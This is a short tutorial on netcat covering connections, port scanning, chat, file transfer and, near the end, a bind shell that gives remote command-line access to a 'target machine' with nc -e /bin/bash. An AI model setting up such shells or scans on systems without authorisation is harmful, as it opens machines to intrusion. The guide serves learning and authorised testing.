# 📚 **Netcat Guide**

## 🛠️ **Basic Commands**

### **Basic Syntax**

```bash
nc [options] [IP Address or hostname] [port]
```

---

## 🌐 **Connecting to a Server**

### **Example: Connect to a Simple TCP Server**

```bash
nc 192.168.1.10 80
```

This connects to **192.168.1.10** on port **80**.

---

## 🔍 **Port Scanning**

### **Example: Scan a Range of Ports**

```bash
nc -zv 192.168.1.10 20-100
```

- **`-z`**: Zero I/O mode (for scanning).
- **`-v`**: Verbose mode (displays more details).

This scans ports **20** to **100** on **192.168.1.10** and shows which are open.

---

## 🔁 **Setting Up a Simple Chat**

### **Step 1: Start a Listener**

On one machine, run:

```bash
nc -lvp 1234
```

- **`-l`**: Listen mode.
- **`-v`**: Verbose output.
- **`-p`**: Specify port (here, **1234**).

### **Step 2: Connect from Another Machine**

```bash
nc 192.168.1.5 1234
```

Replace **192.168.1.5** with the listener’s IP address. Now you can chat between the two machines!

---

## 📤 **File Transfer**

### **Send a File**

On the **sender** machine:

```bash
nc [receiver IP] 1234 < file.txt
```

### **Receive a File**

On the **receiver** machine:

```bash
nc -lvp 1234 > received.txt
```

This sends **file.txt** and saves it as **received.txt** on the receiver’s side.

---

## 🕵️ **Bind Shell (Remote Access)**

### **Start a Bind Shell (on the target machine)**

```bash
nc -lvp 4444 -e /bin/bash
```

- **`-e`**: Executes the specified program (**bash**).

### **Connect to the Shell**

```bash
nc [target IP] 4444
```

Now you have remote access to the target’s command line!

---

## ⚠️ **Important Notes**

1. **Security**: Be cautious when using Netcat for bind shells. Unauthorized use is illegal.
2. **Firewall**: Ensure your firewall settings allow Netcat traffic for legitimate testing purposes.

---

## 🔗 **Common Options Summary**

| Option | Description |
|--------|-------------|
| `-l`   | Listen mode. |
| `-v`   | Verbose mode. |
| `-p`   | Specify a port. |
| `-z`   | Scan mode (no data transfer). |
| `-e`   | Execute a command (used for bind shells). |

---
